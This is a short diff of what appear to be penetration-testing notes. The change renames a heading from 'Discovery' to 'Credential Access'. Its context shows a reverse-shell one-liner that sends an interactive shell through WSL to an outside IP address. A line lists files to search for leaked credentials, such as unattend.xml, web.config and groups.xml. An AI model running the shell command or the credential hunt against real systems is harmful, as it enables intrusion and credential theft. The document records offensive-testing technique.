@@ -107,7 +107,7 @@ C:\Windows\system32\cmd.exe /C wsl sh -i >& /dev/udp/18.197.226.152/4242
 under the same UNUCORB\michelvic user
 ```
 
-Discovery
+Credential Access
 ---------
 
 credential hunting file hunting: password, cred, config, xml, ini, txt, unattend, sysprep | well known creds leak: unattend.xml, sysgrep.inf, web.config, groups.xml, cred.xml
